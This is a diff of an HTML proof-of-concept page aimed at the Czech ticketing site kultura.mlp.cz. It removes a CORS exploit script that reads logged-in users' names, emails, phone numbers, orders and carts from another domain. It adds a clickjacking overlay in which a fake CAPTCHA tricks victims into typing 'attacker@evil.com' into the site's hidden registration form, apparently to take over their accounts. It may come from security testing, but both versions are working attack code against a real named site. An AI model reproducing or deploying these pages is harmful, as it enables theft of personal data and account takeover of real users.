@@ -1,126 +1,14 @@
-<!DOCTYPE html>
-<html lang="cs">
-<head>
-<meta charset="utf-8">
-<title>CORS PoC — kultura.mlp.cz</title>
-<style>
-body{font-family:monospace;background:#111;color:#eee;padding:20px;max-width:800px;margin:0 auto}
-h1{color:#e94560}
-pre{background:#1a1a2e;padding:15px;overflow-x:auto;border-left:3px solid #e94560}
-.ok{color:#4caf50}.bad{color:#f44336}.warn{color:#ff9800}
-button{background:#e94560;color:#fff;border:none;padding:10px 20px;cursor:pointer;font-size:14px;margin:5px 0}
-#log{white-space:pre-wrap;background:#0a0a1a;padding:15px;margin-top:10px;min-height:200px;border:1px solid #333}
-</style>
-</head>
-<body>
-
-<h1>CORS Exploitation PoC</h1>
-<p>Tato stránka demonstruje zneužití CORS misconfiguration na kultura.mlp.cz.</p>
-<p>Origin útočníka: <b id="origin"></b></p>
-
-<button onclick="runExploit()">▶ Spustit exfiltraci</button>
-<div id="log">Klikni na tlačítko...</div>
-
-<script>
-document.getElementById('origin').textContent = window.location.origin;
-
-async function log(msg) {
-    document.getElementById('log').textContent += msg + '\n';
-}
-
-async function exfil(url, label) {
-    try {
-        const r = await fetch(url, {credentials: 'include'});
-        const html = await r.text();
-        log(`\n[${label}] ${r.status} | ${html.length}b`);
-        return html;
-    } catch(e) {
-        log(`\n[${label}] BLOCKED: ${e.message}`);
-        return null;
-    }
-}
-
-async function runExploit() {
-    const el = document.getElementById('log');
-    el.textContent = '';
-    log('=== CORS Exploitation PoC ===');
-    log('Origin: ' + window.location.origin);
-    log('Target: kultura.mlp.cz');
-    log('Timestamp: ' + new Date().toISOString());
-
-    // 1. Profil
-    log('\n--- KROK 1: Exfiltrace profilu ---');
-    const profile = await exfil(
-        'https://kultura.mlp.cz/mkp/General/MyAccount/Registration', 'Profil');
-    
-    if (profile) {
-        const fn = profile.match(/inputName"[^>]*value="([^"]*)"/);
-        const sn = profile.match(/inputSurname"[^>]*value="([^"]*)"/);
-        const em = profile.match(/registrationEmail"[^>]*value="([^"]*)"/);
-        const ph = profile.match(/inputPhone"[^>]*value="([^"]*)"/);
-        const name = profile.match(/login__user-name[^>]*>\s*([^<]+)/);
-
-        log('\nExfiltrované údaje:');
-        log('  Přihlášen jako: ' + (name ? name[1].trim() : '?'));
-        log('  Jméno:    ' + (fn ? fn[1] : '(prázdné)'));
-        log('  Příjmení: ' + (sn ? sn[1] : '(prázdné)'));
-        log('  Email:    ' + (em ? em[1] : '(prázdné)'));
-        log('  Telefon:  ' + (ph ? ph[1] : '(prázdné)'));
-        
-        const emails = profile.match(/[\w.-]+@[\w.-]+\.\w+/g);
-        if (emails) log('  Nalezené emaily: ' + [...new Set(emails)].join(', '));
-
-        // Check auth state
-        const expired = profile.includes('page_expired');
-        const anon = profile.includes('cartAnonymousData');
-        if (expired || !fn) {
-            log('\n⚠ Session je anonymní/expirovaná.');
-            log('  Cookie partitioning pravděpodobně aktivní.');
-            log('  Zkuste vypnout: about:config → network.cookie.cookieBehavior = 0');
-        } else {
-            log('\n✓ EXFILTRACE ÚSPĚŠNÁ — osobní údaje přečteny z cizí domény!');
-        }
-    }
-
-    // 2. Objednávky
-    log('\n--- KROK 2: Exfiltrace objednávek ---');
-    const account = await exfil(
-        'https://kultura.mlp.cz/mkp/General/MyAccount?mrsid=1', 'Objednávky');
-    
-    if (account) {
-        const orders = [...new Set(
-            [...account.matchAll(/orderId[^>]*?(\d+)/g)].map(m => m[1])
-        )];
-        log('  Nalezené objednávky: ' + (orders.length ? orders.join(', ') : '(žádné)'));
-    }
-
-    // 3. Košík
-    log('\n--- KROK 3: Exfiltrace košíku ---');
-    const cart = await exfil(
-        'https://kultura.mlp.cz/mkp/standard/Cart/Index?mrsid=1', 'Košík');
-    
-    if (cart) {
-        const total = cart.match(/value:\s*(\d+)/);
-        const tickets = [...cart.matchAll(/Cart\/Delete\/(\d+)/g)].map(m => m[1]);
-        log('  Celková cena: ' + (total ? total[1] + ' Kč' : '(prázdný)'));
-        log('  Vstupenky: ' + (tickets.length ? tickets.join(', ') : '(žádné)'));
-    }
-
-    // 4. CORS headers check
-    log('\n--- KROK 4: Ověření CORS hlaviček ---');
-    try {
-        const r = await fetch('https://kultura.mlp.cz/mkp/General/MyAccount', {
-            credentials: 'include'
-        });
-        log('  Access-Control-Allow-Origin: ' + (r.headers.get('Access-Control-Allow-Origin') || '(nedostupné z JS)'));
-        log('  Status: ' + r.status);
-        log('  ✓ Server povolil cross-origin čtení z ' + window.location.origin);
-    } catch(e) {
-        log('  ✗ CORS blokováno: ' + e.message);
-    }
-
-    log('\n=== KONEC ===');
-}
-</script>
-</body>
-</html>
+<div style="position:relative; width:900px; height:600px;">
+    <div style="position:absolute; z-index:2; pointer-events:none;">
+        <h2>Ověření identity</h2>
+        <p>Opište text z obrázku:</p>
+        <div style="background:#eee; padding:10px; font-size:24px;
+             font-style:italic; letter-spacing:3px;">
+            attacker@evil.com
+        </div>
+    </div>
+    <iframe src="https://kultura.mlp.cz/mkp/General/MyAccount/Registration"
+            style="position:absolute; z-index:1; opacity:0;
+                   width:100%; height:100%;">
+    </iframe>
+</div>
